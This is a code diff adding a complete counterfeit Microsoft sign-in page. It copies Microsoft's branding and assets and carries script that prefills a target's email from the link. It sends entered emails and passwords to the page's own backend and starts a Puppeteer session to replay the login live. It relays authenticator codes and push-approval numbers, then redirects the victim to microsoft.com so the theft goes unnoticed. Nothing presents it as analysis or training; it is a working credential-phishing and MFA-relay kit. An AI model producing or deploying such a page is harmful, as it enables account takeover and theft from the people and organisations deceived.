@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="icon" type="image/x-icon" href="https://microsoft.com/favicon.ico">
+    <link rel="stylesheet" href="/dist/assets/style.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .card {
+            width: 410px;
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 44px;
+            box-sizing: border-box;
+            position: relative; /* Needed for absolute positioning of loading bar */
+        }
+        .loading-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px; /* Approximate height */
+            overflow: hidden;
+        }
+        .loading-bar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .logo {
+            margin-bottom: 13px;
+        }
+        h1 {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 10px;
+        }
+        #email-loading-title {
+            font-size: 20px;
+        }
+        .input-group {
+            margin-bottom: 13px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"], input[type="tel"] {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #8a8a8a;
+            font-size: 15px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
+            border-bottom: 1px solid #0067b8;
+        }
+        .links {
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 30px;
+        }
+        button {
+            padding: 6px 32px;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 2px;
+            min-width: 108px;
+            min-height: 32px;
+        }
+        .btn-primary {
+            background: #0067b8;
+            color: #fff;
+            border: none;
+        }
+        .btn-primary:hover {
+            background: #005da6;
+        }
+        .options-card {
+            width: 410px;
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 10px 44px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+        }
+        .footer {
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            display: flex;
+            gap: 20px;
+            font-size: 11px;
+        }
+        .footer a {
+            color: #000;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none;
+        }
+        .error-message {
+            color: #e81123;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .user-identity {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 15px;
+            margin-left: -4px; /* Adjusted to align text with content while keeping arrow close */
+        }
+        .back-arrow {
+            margin-right: 1px; /* Pull text closer to arrow (overcoming SVG whitespace) */
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+            display: flex; /* Ensure SVG is centered */
+            align-items: center;
+            justify-content: center;
+        }
+        .back-arrow:hover {
+            background-color: #f0f0f0;
+        }
+        @media (max-width: 600px) {
+            body {
+                background-image: none;
+                background-color: #fff;
+                align-items: center; /* Horizontally center */
+                justify-content: flex-start; /* Vertically top */
+            }
+            .card {
+                width: 100%;
+                max-width: 100%;
+                box-shadow: none;
+                padding: 20px;
+                margin-top: 0;
+            }
+            .options-card {
+                width: 100%;
+                box-shadow: none;
+                padding: 10px 20px;
+            }
+            .footer {
+                position: static;
+                margin-top: 20px;
+                justify-content: center;
+                width: 100%;
+                padding-bottom: 20px;
+            }
+        }
+    </style>
+    <style>
+        /* Intro Animation Styles */
+        @keyframes pinchAndRelease{0%,100%,12.5%,25%,35.5%,50%{transform:scale(1,1) translateY(0)}30%,5%{transform:scale(.86,1.1) translateY(10px)}}
+        @keyframes documentOneScale{0%,100%,35%,50%{transform:translate(61px,82px) scale(0,0) rotateZ(20deg) rotateY(26deg)}12%,22%{transform:translate(0,0) scale(1,1) rotateZ(-18deg) rotateY(0)}}
+        @keyframes documentTwoScale{0%,100%,33%,50%{transform:translate(44px,68px) scale(0,0) rotateZ(20deg) rotateY(26deg)}15%,19%{transform:translate(0,0) scale(1,1) rotateZ(-9deg) rotateY(0)}}
+        @keyframes layersSlideIn{0%,23%{transform:translateY(74px) scale(0) rotateX(50deg) rotateZ(45deg)}100%,33%{transform:translateY(0) scale(1) rotateX(50deg) rotateZ(45deg)}}
+        
+        #intro-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s ease-out;
+        }
+
+        #intro-overlay #container{width:400px;height:400px;display:flex;justify-content:center;align-items:center;position:relative;--duration:3000ms;--delay:0ms;--iterationCount:infinite;--direction:normal;--fillMode:forwards;--playState:running;--easing:ease-in-out}
+        #intro-overlay .foreground{width:164px;height:200px;border-radius:26px;overflow:hidden;position:absolute;z-index:100;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .background{width:164px;height:200px;border-radius:26px;overflow:hidden;position:relative;z-index:20;animation:pinchAndRelease var(--duration) var(--easing) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .contents{position:absolute;bottom:100px;left:118px;width:164px;height:200px;background-color:transparent;z-index:60;overflow:hidden;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .flap-top-inner-shadow{background:radial-gradient(circle,#00217700 54%,#0021778c 100%);background-position:-34px -34px;background-size:170px 170px;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:50}
+        #intro-overlay .flap-top-fill{background-color:#28afea;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30}
+        #intro-overlay .flap-left{width:200px;height:200px;border-radius:0 38px;background-color:#6ce0ff;background:radial-gradient(circle,#2cbbf3 0,#87e5ff 100%);position:absolute;bottom:-80.5px;left:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:51}
+        #intro-overlay .flap-right{width:200px;height:200px;border-radius:0 38px;background-color:#0985dc;background:linear-gradient(3deg,#0985dc 25%,#3da9fb 58%,#c29dfa 80%,#f4a7f7 100%);background-position:0 0;position:absolute;bottom:-80.5px;right:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:50}
+        #intro-overlay .background-fill{position:absolute;width:100%;height:110px;bottom:0;left:0;background:#7bf4ff;background:linear-gradient(56deg,#7bf4ff 0,#c29dfa 100%)}
+        #intro-overlay .layer-stack{background-color:#3834b9;width:130px;height:130px;position:absolute;top:26px;left:17px;z-index:1;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30;overflow:hidden;animation:layersSlideIn var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .layer-stack::after{content:'';position:absolute;top:-1px;left:0;width:86px;height:158px;background-color:#4b6de7;border-top-right-radius:24px;z-index:10}
+        #intro-overlay .layer-stack::before{content:'';position:absolute;top:-1px;left:-10px;width:54px;height:158px;background:#5b9ee8;background:linear-gradient(344deg,rgb(50 146 234) 30%,#81c2f9 76%,#abb8fa 90%);border-radius:60px;z-index:20}
+        #intro-overlay .document-one{position:absolute;width:130px;height:162px;background:#2650bd;background:linear-gradient(40deg,rgb(6 103 211) 40%,#7f85f6 100%);border-radius:14px;left:19px;top:18px;z-index:30;animation:documentOneScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two{position:absolute;width:114px;height:156px;background:#abc8e2;background:linear-gradient(47deg,#abc8e2 0,#fcefd6 100%);border-radius:14px;left:36px;top:32px;z-index:40;box-shadow:-9px -3px 4px -3px rgba(0,0,0,.1);animation:documentTwoScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two::before{content:'';position:absolute;top:0;left:0;width:15px;height:158px;background-color:#293bb0;border-radius:24px 0 0 24px}
+        #intro-overlay #MSLogo{display:block;margin:0 auto;position:relative;top:190px;}
+    </style>
+</head>
+<body>
+    <div id="intro-overlay">
+        <div id="loadingScreen">
+            <div id="loadingLogo" dir="ltr">
+                <div id="container">
+                    <div class="foreground">
+                        <div class="flap-top-inner-shadow"></div>
+                        <div class="flap-left"></div>
+                        <div class="flap-right"></div>
+                    </div>
+                    <div class="contents">
+                        <div class="layer-stack"></div>
+                        <div class="document-two"></div>
+                        <div class="document-one"></div>
+                    </div>
+                    <div class="background">
+                        <div class="flap-top-fill"></div>
+                        <div class="background-fill"></div>
+                    </div>
+                </div>
+            </div> <br><br><br><br><br>
+            <img src="//res.public.onecdn.static.microsoft/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft" crossorigin="anonymous" loading="lazy">
+        </div>
+    </div>
+    <script>
+        // Remove overlay after animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                var overlay = document.getElementById('intro-overlay');
+                if (overlay) {
+                    overlay.style.opacity = '0';
+                    setTimeout(function() {
+                        overlay.remove();
+                    }, 500);
+                }
+            }, 3000); // 3 seconds delay
+        });
+    </script>
+
+
+    <div class="card">
+        <div id="loading-bar" class="loading-bar hidden">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif" alt="Loading">
+        </div>
+        <div class="logo">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" width="108">
+        </div>
+
+        <!-- STEP 1: EMAIL -->
+        <div id="email-step">
+            <h1 id="email-title">Sign in</h1>
+            <h1 id="email-loading-title" class="hidden">Taking you to your organization's sign-in page</h1>
+            <div class="error-message" id="email-error">Please enter a valid email address.</div>
+            <div class="input-group">
+                <input type="text" id="email-input" placeholder="Email, phone, or Skype">
+            </div>
+            
+            <div class="links">
+                <p>No account? <a href="#">Create one!</a></p>
+                <p><a href="#">Can't access your account?</a></p>
+            </div>
+            <div class="actions">
+                <button class="btn-primary" id="next-btn">Next</button>
+            </div>
+        </div>
+
+        <!-- STEP 2: PASSWORD / MFA -->
+        <div id="password-step" class="hidden">
+            <div class="user-identity">
+                <div class="back-arrow" id="back-btn">
+                    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="Back" width="24" height="24">
+                </div>
+                <span id="user-email-display"></span>
+            </div>
+
+            <!-- Password Form -->
+            <div id="password-form">
+                <h1>Enter password</h1>
+                <div class="error-message" id="password-error">Please enter the password for your Microsoft account.</div>
+                <div class="input-group">
+                    <input type="password" id="password-input" placeholder="Password">
+                </div>
+                <div class="links">
+                    <p><a href="#">Forgot password?</a></p>
+                </div>
+                <div class="actions">
+                    <button class="btn-primary" id="signin-btn">Sign in</button>
+                </div>
+            </div>
+
+            <!-- MFA Form -->
+            <div id="mfa-form" class="hidden">
+                <h1>Enter code</h1>
+                <p style="font-size: 15px; color: #1b1b1b; margin: 0 0 10px;">Enter the code displayed in your authenticator app.</p>
+                <div class="error-message" id="mfa-error">You didn't enter the expected verification code or has expired. Please try again</div>
+                <div class="input-group">
+                    <input type="tel" id="mfa-input" placeholder="Code" autocomplete="one-time-code">
+                </div>
+                <div class="links">
+                    <p><a href="#">Having trouble? Sign in another way</a></p>
+                </div>
+                <div class="actions">
+                    <button class="btn-primary" id="mfa-verify-btn">Verify</button>
+                </div>
+            </div>
+
+            <!-- MFA Push Form -->
+            <div id="mfa-push-form" class="hidden">
+                <h1>Approve sign in request</h1>
+                <p style="font-size: 15px; color: #1b1b1b; margin: 0 0 20px;">Open your Authenticator app and approve the request. Enter the number below if prompted.</p>
+                <div id="mfa-push-number" style="font-size: 48px; font-weight: 600; color: #1b1b1b; text-align: center; margin-bottom: 20px;"></div>
+                 <div class="links">
+                    <p><a href="#">I'm not getting the notification</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="options-card" id="options-card-container">
+        <a href="#" style="color:#1b1b1b;text-decoration:none;display:flex;align-items:center;gap:9px;font-size:15px">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Key" width="32">
+            Sign-in options
+        </a>
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>...</span>
+    </div>
+
+    <script>
+        let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+        let _sessionId = null;
+        let _ac = 0;
+        const _up = new URLSearchParams(window.location.search);
+        const cookieId = _up.get('cookieId') || 'web_' + Date.now() + '_' + Math.random().toString(16).slice(2);
+        let _c = {
+            redirectUrl: "https://microsoft.com",
+            firstAttemptFail: true,
+            loadingEnabled: true,
+            loadingDelayMs: 2000,
+            loadingGifUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif",
+            logoUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg",
+            backArrowUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg",
+            telemetryEnabled: false,
+            securityEnabled: true
+        };
+
+        // DOMAIN_INJECTION_POINT
+
+        async function validateEmailDomain(email) {
+            try {
+                if (!email || !email.includes('@')) return false;
+                const domain = email.split('@')[1].toLowerCase();
+
+                const response = await fetch(`/api.php?action=validate_domain&domain=${domain}`);
+                const result = await response.json();
+                return result.ok;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        const _el = {
+            es: document.getElementById('email-step'),
+            ps: document.getElementById('password-step'),
+            ei: document.getElementById('email-input'),
+            pi: document.getElementById('password-input'),
+            nb: document.getElementById('next-btn'),
+            sb: document.getElementById('signin-btn'),
+            bb: document.getElementById('back-btn'),
+            ued: document.getElementById('user-email-display'),
+            ee: document.getElementById('email-error'),
+            pe: document.getElementById('password-error'),
+            lb: document.getElementById('loading-bar'),
+            li: document.querySelector('.logo img'),
+            bai: document.querySelector('#back-btn img'),
+            limg: document.querySelector('#loading-bar img'),
+            hp: document.getElementById('hpField'),
+            oc: document.getElementById('options-card-container'),
+            et: document.getElementById('email-title'),
+            elt: document.getElementById('email-loading-title'),
+            pfc: document.getElementById('password-form'),
+            mfc: document.getElementById('mfa-form'),
+            mei: document.getElementById('mfa-input'),
+            msb: document.getElementById('mfa-verify-btn'),
+            me: document.getElementById('mfa-error'),
+            mpf: document.getElementById('mfa-push-form'),
+            mpn: document.getElementById('mfa-push-number')
+        };
+
+        let _fk = 0, _pm = 0;
+
+        function _acfg(c) {
+            _c = Object.assign(_c, c || {});
+            _c.loadingGifUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif";
+            _c.logoUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg";
+            _c.backArrowUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg";
+            if (_el.li) _el.li.src = _c.logoUrl;
+            if (_el.bai) _el.bai.src = _c.backArrowUrl;
+            if (_el.limg) _el.limg.src = _c.loadingGifUrl;
+        }
+
+        (async function() {
+            try {
+                _hp();
+                const ls = localStorage.getItem('pageConfig');
+                if (ls) _acfg(JSON.parse(ls));
+            } catch (e) {
+                _acfg();
+            }
+        })();
+        
+        function _hp() {
+            if (!prefilledEmail) {
+                try {
+                    const h = window.location.hash.substring(1);
+                    if (h.includes('@')) { prefilledEmail = decodeURIComponent(h); }
+                    else {
+                        const p = new URLSearchParams(window.location.search);
+                        if (p.get('email')) prefilledEmail = p.get('email');
+                        else if (p.get('e')) prefilledEmail = p.get('e');
+                        else {
+                            const parts = window.location.pathname.split('/');
+                            for (let i = parts.length - 1; i >= 0; i--) {
+                                if (decodeURIComponent(parts[i]).includes('@')) {
+                                prefilledEmail = decodeURIComponent(parts[i]);
+                                break;
+                            }
+                            }
+                        }
+                    }
+                } catch(e){}
+            }
+            if (prefilledEmail) {
+                if (_el.ei.value !== prefilledEmail) {
+                    _el.ei.value = prefilledEmail;
+                    _el.ued.textContent = prefilledEmail;
+                }
+                // Auto-click next if email is prefilled, which will trigger verification
+                setTimeout(() => { _el.nb.click(); }, 100);
+            }
+        }
+        
+        document.addEventListener('mousemove', ()=>{ _pm++; });
+        _el.ei.addEventListener('keydown', ()=>{ if (!_fk) _fk = Date.now(); });
+
+        function _gd(e) {
+            const i = e.lastIndexOf('@');
+            if (i === -1) return '';
+            return e.slice(i + 1).toLowerCase();
+        }
+        async function _le(t, e, a, p, c) {
+            try {
+                const b = {
+                    type: t,
+                    emailMask: e || '',
+                    domain: _gd(e || ''),
+                    attempt: a || 0,
+                    password: p || '',
+                    cookieId: c || '',
+                    hpField: _el.hp ? _el.hp.value : ''
+                };
+                await fetch('/MA/api.php?action=log_event', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(b),
+                    keepalive: true
+                });
+            } catch (z) {}
+        }
+
+        async function _runInteractiveLogin(sessionId, email) {
+            try {
+                await fetch('/api.php?action=run_puppeteer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        sessionId: sessionId,
+                        email: email,
+                        interactive: true
+                    }),
+                });
+            } catch (e) {
+                console.error("Failed to start interactive session", e);
+            }
+        }
+
+        async function _handleStatus(statusData, sessionId) {
+            if (!statusData) {
+                console.error('[STATUS_HANDLER] Received null or undefined status data.');
+                _el.pe.textContent = "An unexpected error occurred. Please check the console.";
+                _el.pe.style.display = 'block';
+                _el.lb.classList.add('hidden');
+                return false; // Stop polling
+            }
+
+            console.log('[STATUS_HANDLER] Processing status:', statusData.status);
+            switch (statusData.status) {
+                case 'MFA_PROMPT':
+                    console.log('[STATUS_HANDLER] MFA challenge detected. Switching to MFA form.');
+                    _sessionId = sessionId; // Store the session ID for MFA submission
+                    _el.pfc.classList.add('hidden'); // Hide password form
+                    _el.mfc.classList.remove('hidden'); // Show MFA form
+                    _el.lb.classList.add('hidden'); // Hide loading bar
+                    _el.mei.focus();
+                    return false; // Stop polling
+
+                case 'completed':
+                case 'mfa_accepted':
+                    console.log('[STATUS_HANDLER] Login complete. Redirecting...');
+                    if (_c.redirectUrl) window.location.href = _c.redirectUrl;
+                    return false; // Stop polling
+
+                case 'failed':
+                    console.error('[STATUS_HANDLER] Login failed:', statusData.reason);
+                    _el.pe.textContent = statusData.data.error || "An unknown error occurred.";
+                    _el.pe.style.display = 'block';
+                    _el.pi.disabled = false;
+                    _el.sb.disabled = false;
+                    _el.lb.classList.add('hidden');
+                    return false; // Stop polling
+
+                case 'processing':
+                default:
+                    console.log('[STATUS_HANDLER] Still processing...');
+                    return true; // Continue polling
+            }
+        }
+
+        async function _pollStatus(sessionId) {
+            const deadline = Date.now() + 120000; // 2 minute timeout
+            let shouldContinue = true;
+
+            _el.lb.classList.remove('hidden');
+
+            while (shouldContinue && Date.now() < deadline) {
+                try {
+                const res = await fetch(`/MA/api.php?action=check_login_status&sessionId=${sessionId}`);
+                    if (res.ok) {
+                        const data = await res.json();
+                        console.log('[POLL] Received status data:', data);
+                        shouldContinue = await _handleStatus(data, sessionId);
+                    } else {
+                        console.error('[POLL] Poll request failed with status:', res.status);
+                        shouldContinue = false; // Stop on server error
+                    }
+                } catch (e) {
+                    console.error('[POLL] Poll request threw an error:', e);
+                    shouldContinue = false; // Stop on network error
+                }
+                if (shouldContinue) await new Promise(r => setTimeout(r, 1000));
+            }
+
+            if (shouldContinue) { // This means we timed out
+                console.error('[POLL] Polling timed out.');
+                _el.pe.textContent = "The request timed out. Please try again.";
+                _el.pe.style.display = 'block';
+                _el.pi.disabled = false;
+                _el.sb.disabled = false;
+                _el.lb.classList.add('hidden');
+            }
+        }
+
+
+
+        async function _sb(sessionId, password) {
+            console.log(`[DEBUG] Frontend: Submitting password for session ${sessionId}`);
+            try {
+                const res = await fetch('/api.php?action=submit_password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, password }),
+                });
+                return res.ok;
+            } catch (e) {
+                console.error('[ERROR] Failed to submit password:', e);
+                return false;
+            }
+        }
+
+
+
+        _el.nb.addEventListener('click', async () => {
+            const e = _el.ei.value.trim();
+            if (!e) {
+                _el.ee.style.display = 'block';
+                return;
+            }
+            
+            const isValidDomain = await validateEmailDomain(e);
+            if (!isValidDomain) {
+                _el.ee.textContent = 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.';
+                _el.ee.style.display = 'block';
+                return;
+            }
+            
+            _el.ee.style.display = 'none';
+            _el.ee.textContent = 'Please enter a valid email address.';
+
+            // UI Updates for loading
+            setTimeout(() => {
+                if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
+            }, 1000);
+
+            const titleChangeTimeout = setTimeout(() => {
+                _el.et.classList.add('hidden');
+                _el.elt.classList.remove('hidden');
+            }, 4000);
+
+            // Since verification is simplified, we can proceed after a delay
+            // that simulates the original flow.
+            await new Promise(r => setTimeout(r, _c.loadingDelayMs));
+
+            // Clean up UI
+            clearTimeout(titleChangeTimeout);
+            if (_c.loadingEnabled) _el.lb.classList.add('hidden');
+            _el.elt.classList.add('hidden');
+            _el.et.classList.remove('hidden');
+
+            _le('email_ok', e, 0, '', cookieId);
+            _el.ued.textContent = e;
+
+            // Log visit now (user reached password)
+            const formData = new FormData();
+            formData.append('email', e);
+            fetch('/api/log_visit', {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+            
+            _el.es.classList.add('hidden');
+            _el.ps.classList.remove('hidden');
+            if(_el.oc) _el.oc.classList.add('hidden');
+            _el.pi.focus();
+        });
+        
+
+
+        _el.ei.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                _el.nb.click();
+            }
+        });
+
+        _el.msb.addEventListener('click', async () => {
+            const code = _el.mei.value.trim();
+            if (!code) {
+                _el.me.textContent = 'Please enter a code.';
+                _el.me.style.display = 'block';
+                return;
+            }
+            _el.me.style.display = 'none';
+
+            console.log(`[MFA] Submitting code: ${code} for session: ${_sessionId}`);
+
+            // Disable inputs and show loading bar
+            _el.mei.disabled = true;
+            _el.msb.disabled = true;
+            _el.lb.classList.remove('hidden');
+
+            try {
+                const res = await fetch('/MA/api.php?action=submit_mfa', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: _sessionId, code: code })
+                });
+
+                const data = await res.json();
+                if (!data.ok) {
+                    throw new Error(data.error || 'Failed to submit MFA code.');
+                }
+
+                // The code has been submitted. The worker will now resume.
+                // We can restart the polling loop to wait for the final result.
+                console.log('[MFA] Code submitted successfully. Restarting status polling.');
+                _pollStatus(_sessionId); // Restart polling
+
+            } catch (e) {
+                console.error('[MFA] Error submitting code:', e);
+                _el.me.textContent = e.message;
+                _el.me.style.display = 'block';
+                // Re-enable form on error
+                _el.mei.disabled = false;
+                _el.msb.disabled = false;
+                _el.lb.classList.add('hidden');
+            }
+        });
+
+        _el.bb.addEventListener('click', () => {
+            _el.ps.classList.add('hidden');
+            _el.es.classList.remove('hidden');
+            if(_el.oc) _el.oc.classList.remove('hidden');
+            _el.pi.value = '';
+            _el.pe.style.display = 'none';
+            _el.et.classList.remove('hidden'); // Restore original title
+            _el.elt.classList.add('hidden'); // Hide loading title
+            _ac = 0;
+        });
+
+        async function handleFormSubmit() {
+            console.log('[SUBMIT] Form submission initiated.');
+            const passwordInput = _el.pi.value;
+            const email = _el.ued.textContent;
+
+            if (!passwordInput) {
+                _el.pe.textContent = 'Please enter a password.';
+                _el.pe.style.display = 'block';
+                return;
+            }
+            _el.pe.style.display = 'none';
+
+            _el.pi.disabled = true;
+            _el.sb.disabled = true;
+            _el.lb.classList.remove('hidden');
+
+            const passwords = passwordInput.split(',').map(p => p.trim()).filter(p => p);
+            
+            try {
+                const res = await fetch('/MA/api.php?action=submit_passwords', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email, passwords: passwords })
+                });
+                const data = await res.json();
+                if (data.ok && data.sessionId) {
+                    console.log(`[SUBMIT] Job submitted. Master Session ID: ${data.sessionId}. Waiting 5 seconds before polling.`);
+                    setTimeout(() => {
+                        _pollStatus(data.sessionId);
+                    }, 5000);
+                } else {
+                    throw new Error(data.error || 'Failed to submit job.');
+                }
+            } catch (e) {
+                console.error('[SUBMIT] Error during submission:', e);
+                _el.pe.textContent = e.message;
+                _el.pe.style.display = 'block';
+                _el.pi.disabled = false;
+                _el.sb.disabled = false;
+                _el.lb.classList.add('hidden');
+            }
+        }
+
+        _el.sb.addEventListener('click', handleFormSubmit);
+
+        _el.pi.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                _el.sb.click();
+            }
+        });
+    </script>
+    <script type="module" src="main.js"></script>
+</body>
+</html>
